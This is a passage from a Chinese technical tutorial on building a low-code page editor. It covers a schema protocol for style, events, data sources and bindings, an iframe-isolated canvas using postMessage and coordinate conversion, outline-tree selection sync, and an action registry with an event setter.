- **第二行"Schema 协议"**：中间这行列出的就是本章路线 1 要补齐的六个维度——组件树（`type` + `children`，第 1 章已有）、props（第 1 章已有）、style（样式配置）、events（事件-动作绑定）、dataSource（接口数据声明）、变量（页面级/全局级状态）。协议是整个平台唯一持久化的东西，数据库里存的、版本管理管的就是它，所以它必须可序列化、带版本号（路线 9）。
- **"│ 消费"**：渲染器拿到 schema 后做三件事：递归执行（把树变成组件树，第 1 章递归渲染器）、表达式绑定（对 `bindings` 求值，第 1 章表达式引擎）、动作引擎（执行 `events` 里声明的动作链，本章路线 6）。同一个渲染器既跑在预览页，也跑在正式发布的页面——编辑器里的画布（如果是同 DOM 画布）也是它。
- **一个隐含原则：单一数据源**。编辑器里 schema 存在 zustand 单 store（带 undo/redo），画布、大纲树、属性面板都是它的投影；渲染器里 schema 是只读输入，变量池是运行时状态。schema 永远只有一份权威拷贝，谁改谁通过统一的 `updateSchema` 走 immer patch——这是 undo/redo 能全局成立的前提（第 1 章 1.5）。

### 实现路线（几乎每步都在复用前面章节）

1. **协议升级**（在 1.1 基础上）：节点增加 `style`、`events`（事件-动作绑定）、`dataSource`、`bindings`（数据绑定表达式）
2. 画布：先做同 DOM 画布；**进阶 iframe 隔离画布**（postMessage 通信、选中框跨 iframe 坐标换算、样式隔离）
3. 大纲树：react-arborist 虚拟树，与画布选中态双向联动
4. Setter 进阶：ExpressionSetter（表达式编辑器）、**EventSetter**（动作选择：打开弹窗/调接口/跳转/执行自定义 JS/更新变量）
5. 变量系统：页面级/全局级变量池，渲染时对 `bindings` 表达式求值
6. 动作引擎：action registry，事件触发 → 执行动作链（含串行 await）
7. **安全执行用户自定义 JS**：`new Function` 并不安全（能拿全局对象）；方案：iframe sandbox / quickjs-emscripten 真隔离
8. 出码 vs 渲染（Schwarma 架构取舍）：schema 运行时解释（amis）vs 编译成 React 代码（可维护性），理解各自适用面
9. Schema 版本迁移：协议带 version，写 migration 链（旧版本 schema 升级函数）
10. 选修：协同编辑（Yjs CRDT）、物料远程加载（模块联邦/动态 import）

#### 路线 1：协议升级——style / events / dataSource / bindings

**是什么**：在第 1 章 1.1 的节点协议（`{ type, props, children }`）基础上，把节点扩充为能描述"真实页面"的完整结构——样式怎么呈现（style）、交互做什么（events）、数据从哪来（dataSource）、属性值怎么动态决定（bindings）。

**为什么需要**：第 2/3 章的表单协议只关心字段与校验，第 4 章的面板协议只关心布局与查询。低代码平台的节点是通用组件，"一个商品卡片"同时需要：位置样式（style）、点击跳转（events）、数据来自接口（dataSource）、标题显示变量池里的值（bindings）。这四个维度各自独立声明，才能让"数据"与"表现"解耦——dataSource 改个接口地址，bindings 与 style 不动。

**怎么做**：先给出全部类型定义，再逐个配 JSON 示例。

```ts
// schema/types.ts —— 低代码平台协议（第 3 版，version 字段见路线 9）
export interface SchemaNode {
  id: string;                       // 稳定 id，画布选中/大纲树/undo patch 都靠它
  type: string;                     // 物料名，注册表查找用（'button' | 'card' | 'grid' ...）
  props?: Record<string, unknown>;  // 静态属性：写死的值
  children?: SchemaNode[];          // 容器节点递归 children，原子组件没有
  style?: NodeStyle;                // ← 升级点 1：受控样式子集
  events?: EventBinding[];          // ← 升级点 2：事件-动作绑定
  bindings?: Record<string, string>; // ← 升级点 3：prop 名 → 表达式，动态求值
  dataSourceId?: string;            // ← 升级点 4：挂到页面级哪个数据源
}

// ---- style：白名单式受控子集，不是自由 CSS ----
export interface NodeStyle {
  width?: string;                    // '100px' | '50%'，保留字符串因为单位多样
  height?: string;
  marginTop?: number;                // 间距/字号类用数字，出码/渲染时统一拼 'px'
  marginRight?: number;
  marginBottom?: number;
  marginLeft?: number;
  fontSize?: number;
  color?: string;
  background?: string;
  display?: 'block' | 'flex' | 'inline-flex' | 'none';
  flexDirection?: 'row' | 'column';
  justifyContent?: 'flex-start' | 'center' | 'flex-end' | 'space-between';
  alignItems?: 'flex-start' | 'center' | 'flex-end';
  borderRadius?: number;
  borderWidth?: number;
  borderColor?: string;
}

// ---- events：事件名 → 串行动作链 ----
export interface EventBinding {
  event: string;                     // 'onClick' | 'onChange' | 'onSuccess'（接口回调）...
  actions: ActionConfig[];           // 顺序执行，前一个失败默认中断
}

// 动作配置是 discriminated union：type 收窄 config 的形状
export type ActionConfig =
  | { type: 'openModal'; config: { modalId: string } }
  | { type: 'callApi'; config: { apiId: string; paramsExpr?: string; successActions?: ActionConfig[] } }
  | { type: 'link'; config: { url: string; target?: '_self' | '_blank' } }
  | { type: 'updateVariable'; config: { scope: 'page' | 'global'; name: string; valueExpr: string } }
  | { type: 'runJs'; config: { code: string } }                 // 路线 7 的安全沙箱执行
  | { type: 'emitEvent'; config: { nodeId: string; event: string; payloadExpr?: string } }; // 触发其他节点的事件（死循环源头，见路线 6）

// ---- dataSource：页面级接口声明，节点按 id 引用 ----
export interface DataSourceConfig {
  id: string;
  kind: 'fetch';
  api: string;                       // '/api/users'
  method: 'GET' | 'POST';
  paramsExpr?: string;               // 参数也是表达式："{ keyword: $page.keyword }"，请求发出时求值
  dataPath?: string;                 // 响应取值路径：'data.list'
  pollIntervalMs?: number;           // 定时轮询（第 4 章自动刷新同款，记得 visibilitychange 暂停）
}

// ---- 变量声明 ----
export interface PageVariable {
  name: string;                      // 表达式里用 $page.name 访问
  type: 'string' | 'number' | 'boolean' | 'object' | 'array';
  initial: unknown;
}

// ---- 页面根节点：版本 + 状态 + 数据源 + 组件树 ----
export interface PageSchema {
  version: number;                   // 路线 9 的主角，第一天就要有
  state: {
    pageVariables: PageVariable[];
    globalVariables: string[];       // 只存名字，值在应用全局变量池（登录态、主题等）
  };
  dataSources: DataSourceConfig[];
  nodes: SchemaNode[];
}
```

为什么 `style` 用白名单对象而不是 CSS 字符串：字符串 `style="margin-top:10px"` 需要解析才能 diff、无法静态校验、还可能塞进 `position:fixed` 这类破坏画布布局的值；白名单对象让"属性面板怎么生成 Setter"变得机械（每个字段一个 setter），也让路线 8 的出码器只处理有限集合。为什么 `events` 是数组而不是 `Record<event, actions>`：数组保序（`onClick` 与 `onSuccess` 的展示顺序稳定），且 discriminated union 的 `actions` 天然适合逐条增删。为什么 `bindings` 与 `props` 分离而不是合并：静态值走 `props` 渲染时直接展开，动态值走 `bindings` 渲染时求值并覆盖——分开后"哪些属性是活的"一目了然，diff 与调试都容易。

一份贴近真实的页面 JSON（商品卡片列表 + 刷新按钮）：

```json
{
  "version": 3,
  "state": {
    "pageVariables": [
      { "name": "keyword", "type": "string", "initial": "" },
      { "name": "selectedUser", "type": "object", "initial": null }
    ],
    "globalVariables": ["$global.userName"]
  },
  "dataSources": [
    {
      "id": "ds-users",
      "kind": "fetch",
      "api": "/api/users",
      "method": "GET",
      "paramsExpr": "{ keyword: $page.keyword }",
      "dataPath": "data.list",
      "pollIntervalMs": 30000
    }
  ],
  "nodes": [
    {
      "id": "row-1",
      "type": "grid",
      "style": { "display": "flex", "flexDirection": "row", "gap": 8 },
      "children": [
        {
          "id": "inp-1",
          "type": "input",
          "props": { "placeholder": "搜索用户" },
          "bindings": { "value": "$page.keyword" },
          "events": [
            { "event": "onChange", "actions": [
              { "type": "updateVariable", "config": { "scope": "page", "name": "keyword", "valueExpr": "$event.value" } },
              { "type": "callApi", "config": { "apiId": "ds-users" } }
            ] }
          ]
        },
        {
          "id": "btn-refresh",
          "type": "button",
          "props": { "text": "刷新" },
          "style": { "marginLeft": 8 },
          "events": [
            { "event": "onClick", "actions": [
              { "type": "callApi", "config": { "apiId": "ds-users" } }
            ] }
          ]
        }
      ]
    },
    {
      "id": "card-list",
      "type": "cardList",
      "dataSourceId": "ds-users",
      "bindings": { "items": "$ds['ds-users'].data" }
    }
  ]
}
```

读这份 JSON 时注意三个细节：`bindings.value` 让输入框受控于页面变量（回显永远一致，避开第 2 章"undefined/null/'' 三态"坑）；`onChange` 的动作链是"先更新变量、再调接口"的串行语义（路线 6 实现它）；`$event.value` 是事件上下文注入的临时变量，与 `$page`/`$global`/`$ds` 一样都住在表达式引擎的求值上下文里（第 1 章 1.4）。

**常见坑（症状→根因→修法）**：症状——属性面板改一个字号，画布组件整个消失。根因——`style` 直接整包替换时把 `display` 丢了，或用户输入的 `width` 没带单位（React 会把无单位数字忽略/警告）。修法——Setter 层做"字段级 patch"（`updateStyle(nodeId, { fontSize: 14 })` 用 immer 深合并），渲染层对数值类字段统一拼 `'px'`，对 `width/height` 强制校验单位后缀。

#### 路线 2：画布——从同 DOM 到 iframe 隔离画布

**是什么**：画布是编辑器中间那块"页面预览区"。同 DOM 画布指画布组件与编辑器渲染在同一个 document 里（第 3 章就是这么做的）；iframe 隔离画布指把渲染器（连同 schema）装进一个 `<iframe>`，编辑器只通过 postMessage 与它通信。

**为什么需要**：同 DOM 画布有三个解决不了的问题。第一，样式污染——编辑器的全局 CSS（reset、antd 的样式）会打到画布组件上，画布里物料写的全局样式也会反过来打坏编辑器 UI，双方都"不干净"。第二，业务组件副作用——物料的 `useEffect` 可能往 `document.body` 挂 portal、改 `document.title`、注册全局快捷键，这些都会污染编辑器。第三，隔离升级——物料若依赖不同 React 版本或全局 polyfill，同 DOM 下直接冲突。iframe 给了画布一个独立的 document、独立的样式作用域、独立的全局对象，编辑器与画布互不伤害。代价是：跨 document 的事件与坐标都要靠消息协议搬运——这正是本路线的重头。

**怎么做（一）postMessage 协议设计**。跨 iframe 通信只有 postMessage 一条路，协议必须在第一天设计好，否则后面每种交互都要临时发明消息格式。设计原则：所有消息带 `channel` 字段做命名空间（一个 iframe 可能同时被多种协议使用）；宿主→画布与画布→宿主各自定义成 discriminated union；握手先行、带协议版本号；不确定的消息一律忽略而不是报错。

```ts
// iframe/protocol.ts —— 双端共用，独立成包避免两份定义漂移
export const LC_CHANNEL = 'lowcode-canvas';
export const PROTOCOL_VERSION = 2;

// 编辑器 → 画布
export type HostToCanvas =
  | { channel: typeof LC_CHANNEL; kind: 'bootstrap'; protocolVersion: number; schema: PageSchema }
  // 握手后的全量初始化：schema 是唯一数据源，画布随时可被无状态地重建
  | { channel: typeof LC_CHANNEL; kind: 'schema-update'; schema: PageSchema }
  // schema 变更推送：画布收到后整体重渲染（大树可换 patch 增量，见下文性能注）
  | { channel: typeof LC_CHANNEL; kind: 'select'; nodeId: string | null }
  // 大纲树/属性面板选中了某节点 → 画布高亮该节点并 scrollIntoView
  | { channel: typeof LC_CHANNEL; kind: 'hover'; nodeId: string | null }
  | { channel: typeof LC_CHANNEL; kind: 'drag-move'; innerX: number; innerY: number }
  // 拖拽中：宿主把指针位置换算成 iframe 内部坐标后转发（拖拽期间 iframe 已 pointer-events:none）
  | { channel: typeof LC_CHANNEL; kind: 'drop'; materialName: string };

// 画布 → 编辑器
export type CanvasToHost =
  | { channel: typeof LC_CHANNEL; kind: 'ready'; protocolVersion: number }
  // 握手：iframe 加载完成后主动上报，宿主收到才发 bootstrap（崩溃自动重载后也会重新握手）
  | { channel: typeof LC_CHANNEL; kind: 'selected'; nodeId: string | null }
  // 用户在画布里点击 → 请求编辑器切换选中态（选中态的唯一权威在编辑器 store）
  | { channel: typeof LC_CHANNEL; kind: 'hovered'; nodeId: string | null }
  | { channel: typeof LC_CHANNEL; kind: 'drop-target'; parentId: string; index: number }
  // 画布内部命中测试的结果：宿主据此画插入指示线（若指示线画在画布内则不需要回传）
  | { channel: typeof LC_CHANNEL; kind: 'node-rect'; nodeId: string; left: number; top: number; width: number; height: number }
  // 节点几何信息：宿主用它在外层画选中框（矩形数值是 iframe 内部坐标系，见坐标换算）
  | { channel: typeof LC_CHANNEL; kind: 'viewport'; scrollY: number }
  // 画布滚动/尺寸变化：宿主的选中框覆盖层必须跟随
  | { channel: typeof LC_CHANNEL; kind: 'error'; message: string; nodeId?: string };

// 发送 helper：targetOrigin 用 '*' 是因为 sandbox iframe 是 opaque origin，无法给出具体源；
// 安全性靠接收端校验 e.source 实现（见下文宿主代码）
export function postToCanvas(iframe: HTMLIFrameElement, msg: HostToCanvas) {
  iframe.contentWindow?.postMessage(msg, '*');
}
```

握手流程：iframe 加载完成 → 发 `ready`（带自己支持的协议版本）→ 宿主比较版本：相等则发 `bootstrap`；宿主比画布新（画布是缓存的旧 JS）则提示"画布引擎已更新，正在刷新"并重载 iframe；画布比宿主新一般发生在灰度回滚，同样重载宿主。`schema-update` 全量推送在千节点内足够快（画布端 memo + key 稳定，第 1 章 1.3/1.7），树再大就把 immer patches 一并传过去、画布端 `applyPatches` 增量更新——协议里预留 `patches?: Patch[]` 字段即可平滑升级。

**怎么做（二）宿主侧编辑器与画布容器**。

```tsx
// editor/CanvasFrame.tsx
import { useCallback, useEffect, useRef } from 'react';
import { useEditorStore } from './store';
import {
  LC_CHANNEL, PROTOCOL_VERSION, type CanvasToHost, type HostToCanvas, postToCanvas,
} from '../iframe/protocol';

export function CanvasFrame({ zoom }: { zoom: number }) {
  const iframeRef = useRef<HTMLIFrameElement>(null);
  const wrapperRef = useRef<HTMLDivElement>(null);
  const schema = useEditorStore((s) => s.schema);
  const select = useEditorStore((s) => s.select);

  // 1) 接收画布消息（选中/悬停/几何/滚动），按 kind 分发
  useEffect(() => {
    const onMessage = (e: MessageEvent) => {
      // 校验来源：sandbox iframe 的 origin 是 'null'（字符串），唯一可靠的校验是窗口引用比对
      if (e.source !== iframeRef.current?.contentWindow) return;
      const msg = e.data as CanvasToHost;
      if (msg?.channel !== LC_CHANNEL) return; // 命名空间过滤：忽略其他协议与第三方脚本的消息
      switch (msg.kind) {
        case 'ready':
          // 握手：无论首次加载还是崩溃自动恢复，都无状态地重新 bootstrap
          postToCanvas(iframeRef.current!, {
            channel: LC_CHANNEL, kind: 'bootstrap', protocolVersion: PROTOCOL_VERSION, schema,
          });
          break;
        case 'selected':
          select(msg.nodeId);          // 画布点击 → 更新全局选中态（大纲树会自动跟随）
          break;
        case 'node-rect':
          // 坐标换算后更新覆盖层（见 toEditorRect），此处交给 zustand 的 overlay 状态
          useEditorStore.getState().setOverlayRect(toEditorRect(msg, wrapperRef.current!, zoom));
          break;
        case 'viewport':
          useEditorStore.getState().setOverlayScroll(msg.scrollY);
          break;
        case 'error':
          console.error('[canvas]', msg.message, msg.nodeId);
          break;
      }
    };
    window.addEventListener('message', onMessage);
    return () => window.removeEventListener('message', onMessage);
  }, [schema, select, zoom]);

  // 2) schema 变化 → 推给画布（画布只是投影，schema 权威永远在编辑器 store）
  useEffect(() => {
    const iframe = iframeRef.current;
    if (!iframe) return;
    postToCanvas(iframe, { channel: LC_CHANNEL, kind: 'schema-update', schema });
  }, [schema]);

  // 3) 选中态变化 → 通知画布高亮
  const selectedId = useEditorStore((s) => s.selectedId);
  useEffect(() => {
    iframeRef.current && postToCanvas(iframeRef.current, { channel: LC_CHANNEL, kind: 'select', nodeId: selectedId });
  }, [selectedId]);

  // 4) 拖拽时禁掉 iframe 的指针事件，让父页面接管 mousemove（否则指针一进 iframe 宿主就收不到事件）
  const dragging = useEditorStore((s) => s.dragging);
  useEffect(() => {
    if (iframeRef.current) iframeRef.current.style.pointerEvents = dragging ? 'none' : 'auto';
  }, [dragging]);

  const onDragOverCanvas = useCallback((e: React.DragEvent) => {
    e.preventDefault(); // 允许 drop
    const inner = toInnerPoint(e.clientX, e.clientY, wrapperRef.current!, zoom);
    postToCanvas(iframeRef.current!, { channel: LC_CHANNEL, kind: 'drag-move', innerX: inner.x, innerY: inner.y });
  }, [zoom]);

  return (
    <div ref={wrapperRef} style={{ overflow: 'auto', position: 'relative' }}>
      <div style={{ width: 1200 * zoom, height: 'fit-content', transformOrigin: '0 0' /* 缩放锚点必须是左上角，坐标公式才成立 */ }}>
        <iframe
          ref={iframeRef}
          src="/canvas/index.html"
          sandbox="allow-scripts"       // 不给 allow-same-origin：画布拿不到宿主的 cookie/DOM
          style={{ width: 1200, height: 800, border: 'none', display: 'block', transform: `scale(${zoom})` }}
          onDragOver={onDragOverCanvas}
        />
      </div>
      <SelectionOverlay /> {/* 选中框覆盖层：绝对定位在 wrapper 内，用 node-rect 换算后的坐标 */}
    </div>
  );
}
```

**怎么做（三）跨 iframe 坐标换算**。这是 iframe 画布最容易写错的部分，先把几何关系说清楚：iframe 内部组件的 `getBoundingClientRect()` 返回的是 **iframe 自己的视口坐标系**（缩放前的内部 CSS 像素）；编辑器要在外层画选中框，需要的是**编辑器页面坐标系**。两者之间隔着两件事：iframe 外框在编辑器里的位置，以及画布缩放系数 `zoom`。

```ts
// iframe/coords.ts
// 前提：iframe 的 transform-origin 是 '0 0'，这样 (0,0) 内部点恰好映射到外框视觉左上角
export function toEditorRect(
  inner: { left: number; top: number; width: number; height: number },
  wrapper: HTMLElement,
  zoom: number,
) {
  const w = wrapper.getBoundingClientRect(); // 外框在编辑器页面里的位置（已包含 scale 的视觉效果）
  return {
    left: w.left + inner.left * zoom,        // 内部 x 乘 zoom 变成编辑器像素，再平移到外框原点
    top: w.top + inner.top * zoom,
    width: inner.width * zoom,
    height: inner.height * zoom,
  };
}

// 反向换算：编辑器坐标（如拖拽指针 clientX/clientY）→ iframe 内部坐标（画布做命中测试用）
export function toInnerPoint(clientX: number, clientY: number, wrapper: HTMLElement, zoom: number) {
  const w = wrapper.getBoundingClientRect();
  return { x: (clientX - w.left) / zoom, y: (clientY - w.top) / zoom };
}
```

公式为什么是线性的：CSS `transform: scale(z)` 配合 `transform-origin: 0 0` 就是纯粹的"平移 + 等比缩放"仿射映射——内部点 `(x, y)` 的屏幕位置是 `(w.left + x·z, w.top + y·z)`。一旦 `transform-origin` 是默认的 `center`，映射里会多出一个与外框尺寸相关的常数项，公式立刻失真，选中框会随缩放漂移——这是"选中框漂移"坑的第一根因。注意换算用的 `w` 必须每次实时读取（`getBoundingClientRect`），因为编辑器面板开合会移动外框。

**怎么做（四）画布侧运行时**（打进 `/canvas/index.html` 的独立入口）。

```ts
// canvas/main.ts
import { LC_CHANNEL, type HostToCanvas } from '../iframe/protocol';
import { mountRenderer } from './renderer'; // 第 1 章递归渲染器 + 本章 bindings 求值 + 事件分发

const unmount = { current: () => {} };

window.addEventListener('message', (e: MessageEvent) => {
  const msg = e.data as HostToCanvas;
  if (msg?.channel !== LC_CHANNEL) return;
  switch (msg.kind) {
    case 'bootstrap':
    case 'schema-update':
      unmount.current();
      unmount.current = mountRenderer(msg.schema, document.getElementById('root')!, {
        // 运行时把画布点击/悬停上报给宿主：data-node-id 属性是命中测试的锚
        onSelect: (nodeId) => e.source!.postMessage(
          { channel: LC_CHANNEL, kind: 'selected', nodeId }, '*'),
        onHover: (nodeId) => e.source!.postMessage(
          { channel: LC_CHANNEL, kind: 'hovered', nodeId }, '*'),
        onRect: (nodeId, rect) => e.source!.postMessage(
          { channel: LC_CHANNEL, kind: 'node-rect', nodeId, ...rect }, '*'),
      });
      break;
    case 'select': {
      // 宿主选中（来自大纲树/属性面板）→ 画布高亮 + 滚动到该节点
      document.querySelectorAll('[data-node-id]').forEach((el) =>
        el.classList.toggle('lc-selected', el.getAttribute('data-node-id') === msg.nodeId));
      const target = msg.nodeId && document.querySelector(`[data-node-id="${msg.nodeId}"]`);
      target?.scrollIntoView({ block: 'nearest', inline: 'nearest' });
      break;
    }
    case 'drag-move': {
      // 宿主转发的指针位置（内部坐标）→ 命中测试 → 画插入指示线
      const hit = hitTestContainer(msg.innerX, msg.innerY); // elementFromPoint + data-accept-container 上溯
      showInsertIndicator(hit?.parentId, hit?.index);
      break;
    }
    case 'drop':
      // 宿主说"放了某物料"：画布只负责计算落点，真正插节点的是宿主（schema 权威）
      const hit = lastHit;
      e.source!.postMessage({ channel: LC_CHANNEL, kind: 'drop-target',
        parentId: hit?.parentId ?? '', index: hit?.index ?? 0 }, '*');
      break;
  }
});

// 加载完成 → 主动握手
window.parent.postMessage({ channel: LC_CHANNEL, kind: 'ready', protocolVersion: 2 }, '*');
```

注意分工：**命中测试在画布做（它有 DOM），schema 变更在宿主做（它是权威）**。drop 时画布回报 `parentId/index`，宿主插入节点、store 更新、`schema-update` 推回来，画布重渲染——一去一回形成闭环。反过来让画布直接改 schema 就会出现双写，undo/redo 立刻乱掉。

**怎么做（五）样式隔离手段对比**。

| 手段 | 隔离强度 | 隔离了什么 | 代价 | 适用 |
|---|---|---|---|---|
| CSS 命名空间（postcss 前缀 / CSS Modules） | 弱 | 只防"选择器撞名"，不防全局 reset、`*` 选择器与行内注入 | 几乎为零 | 同 DOM 画布的最低配置 |
| Shadow DOM | 中 | 外部 CSS 进不来（除 CSS 变量可穿透继承）、内部样式不外泄 | 事件被重定向、`portal`/弹层难处理、React 事件系统需注入 | 组件级隔离（单物料内部） |
| iframe（无 allow-same-origin） | 强 | 独立 document/样式表/全局对象，双向完全隔离 | 通信只能 postMessage、坐标/拖拽要搬运（本路线全部内容）、内存开销一个 browsing context | 画布级隔离的标准答案 |

选型结论：画布用 iframe；物料内部如果还有强烈的样式自洽需求（比如要嵌入第三方组件），再叠加 Shadow DOM；命名空间只作为编辑器自身代码的卫生习惯。低代码领域的主流工程（lowcode-engine 的画布模拟、各家大厂的搭建平台）画布最终形态几乎都是 iframe。

**性能注**：iframe 画布每次 `schema-update` 全量重挂载会闪。两个缓解：渲染器入口对 schema 做浅比较后走 React 的正常 reconcile（`mountRenderer` 内部用同一个 root 调 `root.render`，React 的 diff 会复用 DOM）；以及前述 patch 增量方案。选中态高亮绝不要走 schema 更新（那是重渲染），直接改 class / 发消息即可。

**常见坑（症状→根因→修法）**：症状——拖拽从物料面板进入画布区域后，drop 指示线不动了，drop 也落不进去。根因——浏览器的 pointer 事件不会穿透 iframe：指针进入 iframe 后，父页面的 `dragover` 不再触发，宿主拿不到坐标。修法——拖拽期间把 iframe 设为 `pointer-events: none`（上面代码第 4 步），父页面持续收到 move，换算成内部坐标后用 `drag-move` 消息让画布做命中测试与指示线渲染。

#### 路线 3：大纲树与画布选中态双向联动

**是什么**：左侧大纲树（react-arborist 虚拟树）与中间画布共享同一个"当前选中节点"，任意一侧变化另一侧立刻跟随：树里点节点 → 画布高亮并滚动可见；画布里点组件 → 树选中该节点并滚动到它。

**为什么需要**：画布只暴露"看得见的东西"，而 schema 树里有大量画布上不可见或难以精确点中的结构——`display:none` 的隐藏容器、未打开的弹窗与抽屉、深层嵌套的第 20 个子节点。大纲树是结构导航器；没有选中态联动的树与没有树联动画布，用户就要"在两个世界里各找一遍"。这也是编辑器"单一数据源"原则的又一次落地：选中态放在 zustand 里，两个视图都只是订阅它。

**怎么做**：树数据由 schema 派生（`useMemo`），选中态受控传入；画布侧的选中变化经路线 2 的 `selected` 消息写入同一个 store。

```tsx
// editor/OutlineTree.tsx
import { useEffect, useMemo, useRef } from 'react';
import Tree, { type TreeApi, type TreeRef } from 'react-arborist';
import { useEditorStore } from './store';
import { materialRegistry } from '../materials';
import type { SchemaNode } from '../schema/types';

interface OutlineItem { id: string; name: string; children?: OutlineItem[] }

// schema 树 → 大纲树数据：名字用物料元信息里的 label（"卡片列表"而不是 "cardList"）
function toTreeData(nodes: SchemaNode[]): OutlineItem[] {
  return nodes.map((n) => ({
    id: n.id,
    name: materialRegistry.get(n.type)?.label ?? n.type,
    children: n.children?.length ? toTreeData(n.children) : undefined,
  }));
}

export function OutlineTree() {
  const treeRef = useRef<TreeRef>(null);
  const schema = useEditorStore((s) => s.schema);
  const selectedId = useEditorStore((s) => s.selectedId);
  const select = useEditorStore((s) => s.select);

  const treeData = useMemo(() => toTreeData(schema.nodes), [schema]);

  // 反向联动：画布选中（store 变化）→ 树同步选中并滚到可见（树很长时 scrollToId 才有意义）
  useEffect(() => {
    if (!selectedId) return;
    // scrollToId 若当前树为受控 selection 模式，只负责滚动；具体 API 以所装版本 TreeApi 为准
    treeRef.current?.scrollToId(selectedId);
  }, [selectedId]);

  return (
    <Tree
      ref={treeRef}
      data={treeData}
      selection={selectedId ?? undefined}   // 受控选中：唯一权威是 store
      onActivate={(node) => select(node.id)} // 正向联动：点树 → 更新 store → 画布经消息高亮
      indent={16}
      rowHeight={28}
      height={600}
    >
      {({ node, style, data }) => (
        <div style={{ ...style, display: 'flex', alignItems: 'center', gap: 6 }}>
          <span aria-hidden>{node.isOpen ? '▾' : '▸'}</span>
          <span>{data.name}</span>
        </div>
      )}
    </Tree>
  );
}
```

双向联动的完整链路画一遍（这是面试与实战都会问的细节）：

1. 用户点击画布里的卡片 → iframe 内命中测试得到 `nodeId` → `postMessage({kind:'selected'})` → 宿主 `select(nodeId)` 写 store。
2. store 变化触发两个订阅者：`OutlineTree` 的受控 `selection` 变了（React 更新树），effect 里 `scrollToId` 把该节点滚进可视区。
3. 同时路线 2 的 `CanvasFrame` effect 发 `select` 消息回画布 → 画布给该节点加 `lc-selected` class 并 `scrollIntoView`。
4. 大纲树点击则从第 2 步之后开始走，方向相反。

注意避免回环：画布点选 → store 更新 → 给画布发 `select` → 画布又上报 `selected`？不会死循环，因为画布上报 `selected` 的唯一入口是用户交互（click/hover），处理宿主下发的 `select` 消息时只改高亮 class、不再上报。**"消息由用户交互触发，协议命令不产生新上报"**——这条纪律适用于所有双向联动。

**常见坑（症状→根因→修法）**：症状——树里点选正常，但画布点选后树高亮不动。根因——树数据每次 schema 变化重建了 `id` 不稳定的树（比如用数组 index 当 id），react-arborist 受控 selection 找不到对应节点。修法——树 item 的 `id` 必须直接用 schema 的节点 id（本文代码如此），并把 `toTreeData` 的结果用 `useMemo([schema])` 缓存，避免每帧重建整棵树导致滚动位置丢失。

#### 路线 4：Setter 进阶——ExpressionSetter 与 EventSetter

**是什么**：第 3 章 Setter 体系渲染"普通属性"（字符串/数字/布尔/枚举），本章补上两类"活属性"：ExpressionSetter 编辑"值来自表达式"的属性（如输入框的 `value` 绑定 `$page.keyword`），EventSetter 编辑"事件触发后做什么"（动作链）。两者配置的结果分别写入节点的 `bindings` 与 `events` 字段（路线 1 的类型）。

**为什么需要**：静态 props 表达不了联动——"按钮的禁用状态取决于表单是否合法"必须引用变量；事件的语义是"做什么"而不是"是不是"，一个 onClick 可能要做三件事（校验→调接口→弹提示），普通 Setter 的"一个属性一个值"模型装不下，需要"一个事件 N 个动作"的列表模型。更关键的是，EventSetter 里能选什么动作、每个动作要配什么参数，必须由**动作类型注册表**驱动——注册表让"新增一种动作"变成注册一个对象，Setter UI 完全不用改（与第 1 章组件注册表同构，第 3 章自举思想再现）。

**怎么做（一）动作类型注册表**。

```ts
// engine/actionRegistry.ts
import type { ActionConfig } from '../schema/types';
import type { ActionContext } from './context';

export interface ActionDefinition<TConfig> {
  type: string;
  title: string;                          // EventSetter 下拉里显示的名字
  defaultConfig: () => TConfig;           // 选中该动作时的初始配置
  configSchema: FieldSchema[];            // 配置表单也是 schema！用第 3 章 Setter 渲染（自举）
  execute: (config: TConfig, ctx: ActionContext) => Promise<void>;
}

const registry = new Map<string, ActionDefinition<any>>();

export function registerAction<T extends ActionConfig>(def: ActionDefinition<any>) {
  registry.set(def.type, def);
}
export function getAction(type: string) {
  return registry.get(type);
}
export function listActions() {
  return [...registry.values()];          // EventSetter 的下拉选项来源
}
```

注册一批内置动作：

```ts
// engine/builtinActions.ts
import { registerAction } from './actionRegistry';

registerAction({
  type: 'openModal',
  title: '打开弹窗',
  defaultConfig: () => ({ modalId: '' }),
  configSchema: [
    { key: 'modalId', label: '弹窗', type: 'select', options: '=$modals' }, // 选项本身可以是表达式：取页面里所有弹窗节点
  ],
  async execute(config, ctx) {
    await ctx.ui.openModal(config.modalId);   // ui 能力由运行时注入，见路线 6 的 ActionContext
  },
});

registerAction({
  type: 'updateVariable',
  title: '更新变量',
  defaultConfig: () => ({ scope: 'page', name: '', valueExpr: "''" }),
  configSchema: [
    { key: 'scope', label: '作用域', type: 'radio', options: ['page', 'global'] },
    { key: 'name', label: '变量名', type: 'select', options: '=$pageVariables' },
    { key: 'valueExpr', label: '新值表达式', type: 'expression' },   // ← 表达式型属性用 ExpressionSetter
  ],
  async execute(config, ctx) {
    const value = ctx.evaluate(config.valueExpr);                    // 求值时机：执行时（见路线 5）
    ctx.variables.write(config.scope, config.name, value);           // 写变量会触发订阅者重算 bindings
  },
});
// callApi / link / runJs / emitEvent 同理注册；runJs 的 execute 走路线 7 的沙箱
```

**怎么做（二）EventSetter UI**。结构是两层：外层事件列表（这个物料支持哪些事件，来自物料元信息 `events` 声明），内层每事件一个动作链编辑器（从 `listActions()` 选动作 → 渲染该动作的 `configSchema` → 可增删可排序）。

```tsx
// setters/EventSetter.tsx
import { listActions } from '../engine/actionRegistry';
import type { EventBinding } from '../schema/types';
import { SetterForm } from './SetterForm'; // 第 3 章的通用 Setter 渲染器：输入 schema 输出表单

export function EventSetter({
  value, onChange, supportedEvents,
}: {
  value: EventBinding[];
  onChange: (next: EventBinding[]) => void;
  supportedEvents: string[];             // 物料声明，如 ['onClick', 'onDoubleClick']
}) {
  const actions = listActions();
  const setBinding = (event: string, next: EventBinding | null) => {
    const rest = value.filter((b) => b.event !== event);
    onChange(next ? [...rest, next].sort((a, b) => supportedEvents.indexOf(a.event) - supportedEvents.indexOf(b.event)) : rest);
  };
  return (
    <div>
      {supportedEvents.map((event) => {
        const binding = value.find((b) => b.event === event);
        return (
          <section key={event}>
            <header>
              <b>{event}</b>
              {!binding && (
                <button onClick={() => setBinding(event, { event, actions: [] })}>添加</button>
              )}
            </header>
            {binding && (
              <ol>
                {binding.actions.map((action, i) => {
                  const def = actions.find((a) => a.type === action.type)!;
                  return (
                    <li key={i}>
                      <select
                        value={action.type}
                        onChange={(e) => {
                          const type = e.target.value;
                          const next = actions.find((a) => a.type === type)!;
                          const actionList = [...binding.actions];
                          actionList[i] = { type, config: next.defaultConfig() } as typeof action;
                          setBinding(event, { ...binding, actions: actionList });
                        }}
                      >
                        {actions.map((a) => <option key={a.type} value={a.type}>{a.title}</option>)}
                      </select>
